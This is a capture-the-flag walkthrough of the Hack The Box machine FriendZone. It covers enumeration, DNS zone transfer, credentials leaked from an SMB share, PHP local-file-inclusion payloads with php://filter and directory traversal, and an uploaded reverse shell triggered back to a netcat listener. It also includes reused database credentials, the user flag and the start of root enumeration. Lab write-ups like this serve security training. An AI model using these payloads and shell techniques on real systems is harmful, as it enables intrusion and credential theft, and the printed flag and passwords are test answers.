---
description: 10.10.10.123
---

# FriendZone

![](<../../.gitbook/assets/1 (4).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Exposed creds via SMB share. LFI to RCE by uploading reverse shell PHP script to SMB share and executing it using LFI
* Root - Abuse write access to python2 os.py library file, add code to add SUID bit to find binary

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.123 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-08 10:07 EST
Nmap scan report for 10.10.10.123
Host is up (0.080s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 99.08 seconds
```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV -A -p 21,22,53,80,139,443,445 10.10.10.123 -n
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-08 10:12 EST
Nmap scan report for 10.10.10.123
Host is up (0.017s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Linux 3.13 (93%), DD-WRT v3.0 (Linux 4.4.2) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -37m56s, deviation: 1h09m16s, median: 2m03s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-11-08T17:15:04+02:00
| smb2-time: 
|   date: 2021-11-08T15:15:05
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   15.79 ms 10.10.14.1
2   16.45 ms 10.10.10.123

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds

```

Note that we see the following in the nmap output: commonName=friendzone.red. Let's make a note of this as later on we will add it to our /etc/hosts file.

### &#x20;FTP

The ftp service requires creds, and the version of vsFTPd 3.0.3 does not have any public vulnerabilities as far as we're aware. Let's move on.

```
└─$ ftp 10.10.10.123     
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> bye
221 Goodbye.

```

### SMB

There are a few SMB shares, two of which appear to be accessible.

```
└─$ smbmap -H 10.10.10.123                                         
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
Disk            Permissions     Comment
----            -----------     -------
print$          NO ACCESS       Printer Drivers
Files           NO ACCESS       FriendZone Samba Server Files /etc/Files
general         READ ONLY       FriendZone Samba Server Files
Development     READ, WRITE     FriendZone Samba Server Files
IPC$            NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
                                                                                         
```

Let's check out the shares using smbclient:

```
└─$ smbclient \\\\10.10.10.123\\general                                                                       1 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jan 16 15:10:51 2019
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6413088 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \> quit

└─$ smbclient \\\\10.10.10.123\\Development
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Nov  8 10:19:18 2021
  ..                                  D        0  Wed Jan 23 16:51:02 2019

                9221460 blocks of size 1024. 6404216 blocks available
smb: \>
```

There is a creds.txt file on the "general" share. Let's check it out:

```
└─$ cat creds.txt                                                         
creds for the admin THING:

admin:WORKWORKHhallelujah@#

```

We have a set of credentials, but not sure what we can use it for yet. Let's continue.

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]

```

We find an email in the whatweb output, Email\[info@friendzoneportal.red]. This is the second domain that we have found now.

### DNS

Based on our enumeration this far, we have found two domains:

* friendzone.red
* friendzoneportal.red

Let's use some tools to query the DNS service running on the target for using these domains. First, let's use dig. Since we know the server is listening on TCP 53, we may be able to do a zone transfer.

```
└─$ dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.16.21-Debian <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 20 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Tue Nov 09 06:34:52 EST 2021
;; XFR size: 8 records (messages 1, bytes 289)

└─$ dig axfr @10.10.10.123 friendzoneportal.red

; <<>> DiG 9.16.21-Debian <<>> axfr @10.10.10.123 friendzoneportal.red
; (1 server found)
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 12 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Tue Nov 09 06:51:52 EST 2021
;; XFR size: 9 records (messages 1, bytes 309)

```

Instead of adding all these entries to our /etc/hosts file, let's update /etc/resolv.conf instead to point to the target DNS server.

```
└─$ sudo cat /etc/resolv.conf        
# Generated by NetworkManager

nameserver 10.10.10.123
nameserver 8.8.8.8
nameserver 8.8.8.4

└─$ ping administrator1.friendzone.red
PING administrator1.friendzone.red (10.10.10.123) 56(84) bytes of data.
64 bytes from administrator1.friendzone.red (10.10.10.123): icmp_seq=1 ttl=63 time=20.1 ms
64 bytes from administrator1.friendzone.red (10.10.10.123): icmp_seq=2 ttl=63 time=18.2 ms
^C

```

Starting with the first entry, let's visit the page at administrator1.friendzone.red. The page doesn't load if we use HTTP, so let's use HTTPS instead as we know the port is also open on the target.

### Website exploration

Let's visit the page:

![](<../../.gitbook/assets/2 (1) (1).JPG>)

Using the creds we found on the SMB share, we are able to login, and once we do, we get the following message (instead of a redirect ??):

> Login Done ! visit /dashboard.php

Visiting the page at [https://administrator1.friendzone.red/dashboard.php](https://administrator1.friendzone.red/dashboard.php), we are presented with the following instructions:

![](<../../.gitbook/assets/4 (1) (1) (1).JPG>)

First, we need to find a way to upload something. Looking at the output from the dig comand, we saw that the zone transfer also included "uploads.friendzone.red", so we can try upload something there.

{% hint style="danger" %}
I ran into an issue with accessing the page at [https://uploads.friendzone.red/](https://uploads.friendzone.red) which may or may not relate to a misconfiguration on my Kali system. With the nameserver entry in the /etc/resolv.conf file, I was unable to access the uploads page, but when I removed the entry and added it to the /etc/hosts file it worked. After playing around with it for a while, I decided to move on as I couldn't figure out where the problem was.
{% endhint %}

![](<../../.gitbook/assets/3 (1).JPG>)

After uploading a few files (.jpg, .php. .phtml) to test this, all we get back is something similar to the following (different number each time):

> Uploaded successfully ! 1636471786

The number could be a Unix timestamp, based on the parameters provided on the dashboard page. We can check this using the "date" command in bash:

```
└─$ date -d @1636471786                                                       
Tue Nov  9 10:29:46 AM EST 2021

```

So something is generating the timestamp for each upload. Let's run gobuster to see if we can find any other php files on this site:

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -u https://administrator1.friendzone.red/ -k -x php 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://administrator1.friendzone.red/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/09 10:05:22 Starting gobuster
===============================================================
/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)


```

There is a timestamp.php file, which is most likely generating the Unix timestamp number when a file is uploaded via the uploads site.

Let's investigate the parameters on the dashboard page:

* default is image\_id=a.jpg\&pagename=timestamp
* image\_id - the filename to fetch from the /images directory
* pagename - since the default value here is called timestamp, we could probably assume that this parameter is calling timestamp.php via a statement similar to the following:
  * &#x20;**include($\_GET\["pagename"].".php");**

Let's try adding the default parameters as mentioned on the page:

![](<../../.gitbook/assets/5 (1) (1).JPG>)

We get a page back with the image, a.jpg, and a timestamp. What happens if we replace "timestamp" with "login", which is one of the other PHP files found by gobuster? Let's try it:

![](<../../.gitbook/assets/6 (1) (1) (1) (1).JPG>)

Now we are getting an error. Probing further, let's try "uploads". We don't get any error this time, but this is because the uploads.php file is not in the same directory that we are currently in. We could try and use directory traversal techniques to see if we can load other PHP files.

Let's run gobuster again on the [https://uploads.friendzone.red/](https://uploads.friendzone.red) site:

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -u https://uploads.friendzone.red/ -k -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://uploads.friendzone.red/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/11/09 10:36:21 Starting gobuster
===============================================================
/files (Status: 301)
/upload.php (Status: 200)

```

We now know that there is an /uploads/upload.php file. Visiting the page at [https://uploads.friendzone.red/upload.php](https://uploads.friendzone.red/upload.php) we get the following:

![](<../../.gitbook/assets/7 (1) (1).JPG>)

Let's try to reach the "upload.php" file using file traversal in the pagename parameter, like this:

[https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=../uploads/upload](https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=../uploads/upload)

![](<../../.gitbook/assets/8 (1) (1) (1).JPG>)

We get back the same string. Taking this one step further, let's see if we can get the source code using a PHP wrapper. For information on PHP wrappers check out the following page:

{% embed url="https://www.php.net/manual/en/wrappers.php.php" %}

We can use the "php://filter" wrapper to extract the contents of the target file and base64 encode it. If we don't base64 encode the contents, the result will simply be the same as if the script was executed.

[https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=php://filter/convert.base64-encode/resource=../uploads/upload](https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=php://filter/convert.base64-encode/resource=../uploads/upload)

From the above payload, we get the base64 encoded string shown below:

> PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=

We can decode it to view the source code of the upload.php file. As we can see below, nothing is actually being uploaded to the server. The script simply displays the message "Uploaded successfully" along with the Unix timestamp using the time() function.

```
└─$ echo 'PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K' | base64 -d
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>

```

Using this same method, we can also grab the source code of the timestamp.php file, and any others we are able to find:

```
└─$ echo 'PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=' | base64 -d
<?php


$time_final = time() + 3600;

echo "Final Access timestamp is $time_final";


?>

```

Extract "login.php"

```
└─$ echo 'PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K' | base64 -d
<?php


$username = $_POST["username"];
$password = $_POST["password"];

//echo $username === "admin";
//echo strcmp($username,"admin");

if ($username==="admin" and $password==="WORKWORKHhallelujah@#"){

setcookie("FriendZoneAuth", "e7749d0f4b4da5d03e6e9196fd1d18f1", time() + (86400 * 30)); // 86400 = 1 day

echo "Login Done ! visit /dashboard.php";
}else{
echo "Wrong !";
}



?>

```

Extract "dashboard.php"

```
└─$ echo 'PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=' | base64 -d
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

## Gaining Access

To gain access we need two things to be true. First, we need to be able to upload a PHP file somewhere, and second, it must be accessible to us. We know the following thus far:

* We have READ/WRITE access to the SMB share "Development", and based on the comments in the output from smbmap, we can guess that the location of this directory is /etc/Development
* We have LFI, and so we should be able to reach the file we upload using directory traversal

First, configure a reverse shell PHP file with our attacker IP and port (eg. in Kali /usr/share/webshells/php/reverse-shell.php), and upload it to the SMB share.

```
└─$ smbclient \\\\10.10.10.123\\Development
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put rshell.php 
putting file rshell.php as \rshell.php (85.1 kb/s) (average 85.1 kb/s)
smb: \> dir
  .                                   D        0  Tue Nov  9 11:51:41 2021
  ..                                  D        0  Wed Jan 23 16:51:02 2019
  rshell.php                          A     5492  Tue Nov  9 11:51:41 2021

                9221460 blocks of size 1024. 6135856 blocks available
smb: \> exit
```

Start a netcat listener and try and trigger the reverse shell using the LFI:

[https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=../../../../../etc/Development/rshell](https://administrator1.friendzone.red/dashboard.php?image\_id=a.jpg\&pagename=../../../../../etc/Development/rshell)

```
└─$ nc -nvlp 8888         
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.123.
Ncat: Connection from 10.10.10.123:53656.
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 18:55:12 up  5:34,  0 users,  load average: 0.09, 0.22, 0.16
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Nice, we now have a shell on the target system as the "www-data" user. Let's grab the user flag after upgrading the terminal.

```
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@FriendZone:/$ cd home
cd home
www-data@FriendZone:/home$ ls
ls
friend
www-data@FriendZone:/home$ cd friend
cd friend
www-data@FriendZone:/home/friend$ ls
ls
user.txt
www-data@FriendZone:/home/friend$ cat user.txt
cat user.txt
a9ed20acecd6c5b6b52f474e15ae9a11
www-data@FriendZone:/home/friend$
```

## Enumeration as "www-data"

Let's have a look around in the webroot.

```
www-data@FriendZone:/var/www$ ls -la
ls -la
total 36
drwxr-xr-x  8 root root 4096 Oct  6  2018 .
drwxr-xr-x 12 root root 4096 Oct  6  2018 ..
drwxr-xr-x  3 root root 4096 Jan 16  2019 admin
drwxr-xr-x  4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x  2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x  2 root root 4096 Jan 15  2019 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Oct  6  2018 html
-rw-r--r--  1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x  3 root root 4096 Oct  6  2018 uploads
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$ su friend
su friend
Password: Agpyu12!0.213$

friend@FriendZone:/var/www$ id
id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
friend@FriendZone:/var/www$ 

```

Nice, there is a set of creds for the user "friend", which has been reused for multiple logins, which is very poor administrative form.

## Enumeration as "friend"

Let's check basic system information:

```
friend@FriendZone:~$ uname -a; cat /etc/*-release; netstat -antp; find / -perm -4000 2>/dev/null
<ease; netstat -antp; find / -perm -4000 2>/dev/null
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.1 LTS"
NAME="Ubuntu"
VERSION="18.04.1 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.1 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 10.10.10.123:53         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   
tcp        0      1 10.10.10.123:37776      8.8.4.4:53              SYN_SENT    -                   
tcp        0    957 10.10.10.123:53892      10.10.14.7:8888         ESTABLISHED 4685/bash           
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::445                  :::*                    LISTEN      -                   
tcp6       0      0 :::139                  :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.123:443        10.10.14.7:58328        ESTABLISHED -                   
/bin/fusermount
/bin/umount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
friend@FriendZone:~$ 

```

#### Pspy64

Transfer and run pspy64, which monitors processes and displays the output in a nice tabular format:

```
friend@FriendZone:~$ ./pspy64
./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2021/11/09 19:56:27 CMD: UID=0    PID=98     | 
2021/11/09 19:56:27 CMD: UID=0    PID=9      | 
...
2021/11/09 19:58:01 CMD: UID=0    PID=36185  | /usr/bin/python /opt/server_admin/reporter.py 
2021/11/09 19:58:01 CMD: UID=0    PID=36184  | /bin/sh -c /opt/server_admin/reporter.py 
2021/11/09 19:58:01 CMD: UID=0    PID=36183  | /usr/sbin/CRON -f 
2021/11/09 19:59:23 CMD: UID=33   PID=36186  | su friend 
2021/11/09 20:00:01 CMD: UID=0    PID=36189  | /usr/bin/python /opt/server_admin/reporter.py 
2021/11/09 20:00:01 CMD: UID=0    PID=36188  | /bin/sh -c /opt/server_admin/reporter.py 
...

```

In the output above, we can see a task running every couple of minutes or so:

> /usr/bin/python /opt/server\_admin/reporter.py
>
> /bin/sh -c /opt/server\_admin/reporter.py

The limited shell we have can become quite annoying after a while. We know that the system is running SSH, and although there are no SSH keys for the user "friend", it is possible that the server doesn't require keys. Let's check the sshd\_config file:

```
friend@FriendZone:~$ sed '/^\//d;/^\#/d;/^[[:space:]]*$/d' /etc/ssh/sshd_config 
PermitRootLogin yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
